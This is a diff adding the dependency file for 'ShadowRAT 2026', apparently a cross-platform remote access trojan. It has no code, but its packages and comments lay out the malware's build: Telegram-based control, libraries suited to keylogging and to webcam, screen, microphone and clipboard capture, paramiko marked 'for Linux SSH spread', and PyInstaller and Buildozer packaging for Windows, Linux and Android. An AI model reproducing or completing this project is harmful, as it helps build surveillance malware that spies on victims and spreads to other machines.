@@ -1,0 +1,27 @@
+# ShadowRAT 2026 – Unified Requirements (Windows + Linux + Android)
+
+# ── Core / Common (all platforms) ───────────────────────────────────────────────
+pyTelegramBotAPI >= 4.14.0
+pillow >= 10.4.0
+cryptography >= 43.0.1
+psutil >= 6.0.0
+netifaces >= 0.11.0
+
+# ── Windows & Linux features ────────────────────────────────────────────────────
+pynput >= 1.7.7
+opencv-python >= 4.10.0
+pyautogui >= 0.9.54
+sounddevice >= 0.4.7
+soundfile >= 0.12.1
+pyperclip >= 1.9.0
+paramiko >= 3.4.0               # for Linux SSH spread
+
+# ── Build tools ─────────────────────────────────────────────────────────────────
+pyinstaller >= 6.10.0           # Windows & Linux standalone binaries
+
+# ── Android / Kivy / Buildozer stack ────────────────────────────────────────────
+# (install ONLY inside Linux / WSL2 / Docker – not on Windows native)
+# kivy >= 2.3.0
+# pyjnius >= 1.6.1
+# buildozer >= 1.5.0
+# cython == 0.29.37             # critical – newer versions break buildozer often
